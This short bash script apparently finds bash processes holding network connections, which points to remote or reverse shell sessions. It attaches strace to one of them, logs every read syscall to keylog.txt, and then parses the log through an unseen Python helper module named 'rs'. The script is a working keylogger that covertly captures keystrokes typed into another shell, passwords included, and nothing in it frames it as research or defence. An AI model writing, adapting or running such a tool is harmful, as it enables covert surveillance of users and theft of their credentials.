#!/bin/bash
lsof -i | grep bash |awk '{print $2}' | tail > pids.txt
if [ -s pids.txt ]
  then
	shell_pid="$(python -c "import rs; rs.getPID();")"
	echo $shell_pid
	strace -p$shell_pid -o keylog.txt -e trace=read > /dev/null &
	python -c "import rs; rs.parse_keylog();"
fi
